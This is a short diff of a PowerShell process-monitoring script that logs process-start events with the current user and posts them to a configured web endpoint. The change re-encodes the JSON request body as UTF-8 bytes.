@@ -23,8 +23,9 @@ $currentUser = $str.ToString()
 
 Register-CimIndicationEvent -ClassName Win32_ProcessStartTrace -SourceIdentifier "ProcessStarted"
 function store($data) {
-    $JSON = $data | ConvertTo-Json
-    $response = Invoke-WebRequest -Uri $uri -Method Post -Body $JSON -ContentType "application/json" -Headers $headers
+	$JSON = $data | ConvertTo-Json
+	$body = [System.Text.Encoding]::UTF8.GetBytes($JSON.ToString());
+    $response = Invoke-WebRequest -Uri $uri -Method Post -Body $body -ContentType "application/json" -Headers $headers
 }
 
 while ($true)
